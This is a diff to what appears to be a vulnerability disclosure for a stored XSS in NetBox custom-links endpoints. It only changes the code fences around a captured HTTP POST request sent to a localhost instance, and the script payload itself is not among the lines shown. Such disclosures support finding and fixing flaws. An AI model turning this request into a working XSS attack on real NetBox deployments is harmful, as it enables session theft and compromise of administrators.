@@ -10,7 +10,7 @@ Store XSS on the api /extras/custom-links/add/ or /extras/custom-links/{id}/edit
 
 3, Immediately boom, Stored XSS is executed
 
-'''POST /extras/custom-links/add/ HTTP/1.1
+```POST /extras/custom-links/add/ HTTP/1.1
 Host: localhost:8000
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -79,7 +79,7 @@ Content-Disposition: form-data; name="_create"
 
 
 -----------------------------300193789523924448502163188369--
-'''
+```
 ![image](https://github.com/minhquan202/Vuln-Netbox-XSS/assets/89106168/bf617022-880a-4c2a-a798-002a25da662b)
 ![image](https://github.com/minhquan202/Vuln-Netbox-XSS/assets/89106168/6ce2c08d-9ead-480f-8d4f-1f3e2954abbb)
 
